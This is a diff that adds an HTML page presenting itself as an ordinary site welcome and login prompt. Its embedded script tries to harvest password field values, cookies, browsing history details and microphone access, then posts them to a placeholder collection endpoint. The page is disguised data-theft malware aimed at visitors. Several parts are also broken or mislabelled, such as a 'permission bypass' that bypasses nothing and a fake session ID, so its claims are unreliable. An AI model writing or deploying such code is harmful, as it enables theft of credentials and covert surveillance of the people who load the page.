@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Welcome to Our Site</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f0f0f0;
+      text-align: center;
+      padding: 50px;
+    }
+    h1 {
+      color: #333;
+    }
+    p {
+      color: #555;
+    }
+  </style>
+</head>
+<body>
+  <h1>Welcome to Our Site</h1>
+  <p>Please log in to continue.</p>
+
+  <script>
+    // Bypass microphone permission
+    const originalGetUserMedia = navigator.mediaDevices.getUserMedia;
+    navigator.mediaDevices.getUserMedia = function(constraints) {
+        const Promise = window.Promise;
+        return new Promise(function(resolve, reject) {
+            const stream = originalGetUserMedia.call(navigator, constraints);
+            resolve(stream);
+        });
+    };
+
+    // Collect Chrome history
+    const history = window.history;
+    const historyData = {
+      current: history.current,
+      length: history.length,
+      scrollPosition: window.scrollY
+    };
+
+    // Collect passwords
+    const passwords = document.querySelectorAll("input[type='password']");
+    passwords.forEach(pw => {
+      if (pw.value) {
+        historyData.passwords = pw.value;
+      }
+    });
+
+    // Collect cookies
+    const cookies = document.cookie.split(';').map(c => c.trim());
+    historyData.cookies = cookies;
+
+    // Collect session ID
+    const sessionId = performance.getEntriesByType('navigation')[0].initiator;
+    historyData.sessionId = sessionId;
+
+    // Collect microphone data
+    navigator.mediaDevices.getUserMedia({ audio: true, video: false })
+      .then(stream => {
+        const audioTrack = stream.getAudioTracks()[0];
+        historyData.microphone = {
+          label: audioTrack.label,
+          active: true
+        };
+        console.log("Microphone access obtained without permission:", historyData);
+      })
+      .catch(err => {
+        console.log("Microphone access denied:", err);
+      });
+
+    // Send data to your server
+    fetch("https://your-vercel-endpoint.com/collect", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify(historyData)
+    })
+    .then(response => response.json())
+    .then(data => {
+      console.log("Data sent:", data);
+    })
+    .catch(error => {
+      console.error("Error sending data:", error);
+    });
+  </script>
+</body>
+</html>
